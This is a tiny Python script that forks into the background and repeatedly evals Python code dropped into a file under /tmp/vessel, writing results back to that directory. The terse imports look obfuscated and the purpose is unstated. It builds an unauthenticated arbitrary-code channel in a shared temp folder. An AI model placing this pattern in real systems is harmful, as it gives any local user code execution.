i=__import__
b,os,t=i("base64"),i("os"),i("time")
so,z,F=i("socket"),i("zlib"),i("pathlib").Path("/tmp/vessel")
def RW(f,s=0):
  F.exists() or exit()
  return open(F/f,"w").write(s)if(s)else(open(F/f,"r").read())
try:n=0;n=os.fork()
except:1
F.mkdir(exist_ok=1);RW("s","READY")
while n==0:
  while RW("s")[:4]!="EVAL":t.sleep(1e-3)
  try:c=RW("c");os.remove(F/"c")
  except:RW("s","NOFILE");continue
  try:r="R:"+str(eval(c,globals()));RW("c",r);RW("s","WAITING")
  except:RW("s","FAILED");i("traceback").print_exc()
